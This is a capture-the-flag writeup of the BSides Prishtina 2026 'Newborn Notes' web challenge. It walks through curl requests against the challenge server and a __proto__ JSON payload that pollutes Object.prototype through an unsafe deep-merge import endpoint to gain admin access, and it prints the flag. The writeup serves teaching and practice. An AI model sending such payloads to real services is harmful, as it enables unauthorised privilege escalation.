@@ -1,0 +1,211 @@
+﻿---
+title: Newborn Notes
+summary: Web challenge writeup from BSides Prishtina 2026.
+tags: CTF Writeups, BSides Prishtina 2026, Web
+publishedAt: '2026-05-25'
+public: true
+language: "en"
+translationKey: "bsides-prishtina-2026-newborn-notes"
+---
+| Category | Difficulty | Points | Protocol            |
+| -------- | ---------- | ------ | ------------------- |
+| Web      | Medium     | 350    | HTTP / Web Instance |
+
+---
+
+# Challenge Information
+
+I no longer have the challenge description (sorry).
+
+---
+
+# Introduction
+
+A web application called `newborn-notes` was provided to us. The users could register, login, create notes, and import notes into their collection.
+
+The important detail was the import functionality, which mentioned that imported notes would be **deep-merged** into the user's collection. That ended up being the entire vulnerability for this challenge.
+
+I started by interacting with the registration endpoint to see what kind of validation existed.  
+  
+Trying weak credentials:
+
+```bash  
+curl -X POST http://challs.bsidesprishtina.org:30376/register \  
+-H "Content-Type: application/json" \  
+-d '{"username":"test","password":"test"}'
+```
+
+Returned:
+
+```json
+{"error":"invalid username or password"}
+```
+
+So the application clearly enforced some password requirements.
+
+Using stronger credentials worked:
+
+```bash
+curl -X POST http://challs.bsidesprishtina.org:30376/register \
+  -H "Content-Type: application/json" \
+  -d '{"username":"testuser","password":"Test1234!"}'
+```
+
+```json
+{"ok":true}
+```
+
+After registering, I logged in and saved the session cookie:
+
+```bash
+curl -X POST http://challs.bsidesprishtina.org:30376/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"testuser","password":"Test1234!"}' \
+  -c cookies.txt -v
+```
+
+The response included:
+
+```text
+Set-Cookie: session=testuser.x0mmWmPdxzwjNVzj5sbatdbpJ7gCMkdP
+```
+
+The cookie format looked interesting:
+
+```text
+username.signature
+```
+
+At first glance, it looked like the challenge might involve weak session signing or cookie forgery.
+
+I tried replacing the username with `admin` while keeping the same signature:
+
+```bash
+curl http://challs.bsidesprishtina.org:30376/notes \  -b 'session=admin.x0mmWmPdxzwjNVzj5sbatdbpJ7gCMkdP'
+```
+
+But the server immediately redirected back to login:
+
+```text
+Found. Redirecting to /login
+```
+
+So the signature was properly tied to the username and cookie forgery was not the intended path.
+
+---
+
+# Discovering the Vulnerability
+
+Next I checked the actual notes page:
+
+```bash
+curl http://challs.bsidesprishtina.org:30376/notes \
+  -b cookies.txt
+```
+
+The page itself gave away the vulnerability.
+
+Inside the import section was this text:
+
+```text
+We deep-merge it into your collection so nested fields like
+metadata.tags survive.
+```
+
+And it showed the API endpoint:
+
+```text
+POST /notes/import
+```
+
+Unsafe deep merges in JavaScript applications are a classic source of:
+
+# Prototype Pollution
+
+The import functionality was almost certainly recursively merging user-controlled JSON into an existing object without sanitizing dangerous keys like:
+- `__proto__`
+- `constructor`
+- `prototype`
+
+---
+
+# Exploitation
+
+I crafted a payload targeting `__proto__`:
+
+```bash
+curl -X POST http://challs.bsidesprishtina.org:30376/notes/import \
+  -H "Content-Type: application/json" \
+  -b cookies.txt \
+  -d '{
+    "notes": {
+      "__proto__": {
+        "isAdmin": true
+      }
+    }
+  }'
+```
+
+The server responded with:
+
+```json
+{"ok":true,"imported":0}
+```
+
+Even though nothing was imported, the important part was whether the global object prototype had been polluted.
+
+The navbar on the notes page already exposed an `/admin` endpoint, so after sending the payload I tried accessing it directly:
+
+```bash
+curl http://challs.bsidesprishtina.org:30376/admin -b cookies.txt
+```
+
+This time the request succeeded.
+
+The application was likely doing an authorization check similar to:
+
+```javascript
+if (user.isAdmin)
+```
+
+Since `Object.prototype.isAdmin` had been polluted and set to `true`, my normal user object inherited the property and was treated as an administrator.
+
+Access to the admin panel revealed the flag.
+
+---
+
+# Root Cause
+
+The vulnerability existed because the application recursively merged user-controlled JSON into internal application objects without sanitizing prototype-related properties.
+
+Conceptually, the backend was doing something similar to:
+
+```javascript
+deepMerge(target, userInput)
+```
+
+without filtering dangerous keys.
+
+That allowed modification of `Object.prototype`, resulting in privilege escalation through inherited properties.
+
+---
+
+# Final Payload
+
+```json
+{
+  "notes": {
+    "__proto__": {
+      "isAdmin": true
+    }
+  }
+}
+```
+
+---
+
+# Flag
+
+```text
+BSidesPR26{04446c7568fc774748c70c65b7dbdb0a}
+```
